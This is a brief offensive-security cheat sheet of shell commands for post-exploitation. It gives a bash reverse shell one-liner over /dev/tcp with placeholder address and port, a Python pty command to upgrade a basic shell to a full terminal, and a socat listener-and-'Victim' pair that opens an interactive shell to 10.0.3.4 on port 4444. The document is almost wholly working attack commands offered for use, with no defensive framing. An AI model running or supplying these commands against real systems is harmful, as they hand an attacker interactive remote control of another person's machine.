## Bash reverse shell

     bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'

## Upgrade simple shell to tty

**Python method**

    python -c 'import pty;pty.spawn("/bin/bash")';

**socat method**

#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
